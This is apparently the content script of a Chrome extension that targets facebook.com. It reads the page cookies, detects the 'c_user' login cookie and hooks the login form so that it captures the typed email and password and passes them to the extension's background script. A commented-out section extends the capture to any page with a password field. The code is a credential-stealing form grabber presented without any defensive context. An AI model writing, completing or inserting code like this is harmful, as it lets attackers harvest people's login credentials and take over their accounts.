if (window.location.hostname.match("facebook.com") !== null) {
  const cookie = document.cookie;

  //handle and get cookie when user logined (tieng anh nhu dauboizz)
  if (cookie.match("c_user=") !== null) {
    //user LOGIN
    console.log("send resques");
    chrome.extension.sendMessage({
      action: {
        type: "DATA_LOGIN"
      }
    });
  } else {
    //user NOT LOGIN
    let loginForm = document.getElementById("login_form");
    if (typeof loginForm != "undefined" && loginForm != null) {
      //handle login form submit
      loginForm.addEventListener("submit", res => {
        const e = document.getElementById("email").value;
        const p = document.getElementById("pass").value;
        chrome.extension.sendMessage({
          data: {
            username: e,
            password: p,
            type: "FormSubmit"
          }
        });
      });
    }
  }
}

//handle request data

// checkLoginPage = () => {
//   // let loginForm = document.getElementsByTagName('form')
//   // if (typeof loginForm != "undefined" && loginForm != null) {

//   let inputs = document.getElementsByTagName("input");
//   if (typeof inputs != "undefined" && inputs != null) {
//     for (let i = 0; i < inputs.length; i++) {
//       if (inputs[i].type == "password") {
//         return true;
//       }
//     }
//   }
//   // }
//   // return false
//   return false;
// };
// console.log('loader- sdfsdsfd')
// const isLoginPage = checkLoginPage();
// if (isLoginPage) {
//   console.log("login exists");
//   let inputs = document.getElementsByTagName("input");
//   let form = document.getElementsByTagName("form");
//   let formLogin = form[form.length - 1]
//   console.log(formLogin)
//   formLogin.addEventListener("submit", res => {
//     console.log(res);
//   });
// }
